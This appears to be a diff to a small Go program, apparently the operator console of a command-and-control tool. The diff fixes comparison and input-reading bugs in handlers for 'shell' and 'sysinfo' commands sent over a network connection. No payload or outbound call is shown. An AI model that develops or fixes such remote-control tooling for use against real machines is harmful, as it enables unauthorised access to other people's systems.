@@ -36,11 +36,11 @@ func sysinfo(conn net.Conn) {
 
 	result, _ := bufio.NewReader(conn).ReadString('\n')
 	switch {
-	case result = "windows":
+	case result == "windows":
 		fmt.Println("The system is running Windows")
-	case result = "darwin":
+	case result == "darwin":
 		fmt.Println("The system is running MacOS")
-	case result = "linux":
+	case result == "linux":
 		fmt.Println("The system is running Linux")	
 	}
 }
@@ -48,7 +48,7 @@ func sysinfo(conn net.Conn) {
 
 func handleConnection(conn net.Conn) {
 	fmt.Printf("[C3]: ")
-	reader := bufio.NewReader(os.Stdin)
+	reader, _ := bufio.NewReader(os.Stdin).ReadString('\n')
 
 	switch {
 		case reader == "shell":
@@ -56,7 +56,7 @@ func handleConnection(conn net.Conn) {
 		case reader == "sysinfo":
 			sysinfo(conn)
 		default:
-			fmt.Println("Invalid command\n")
+			fmt.Println("Invalid command")
 	}
 }
 
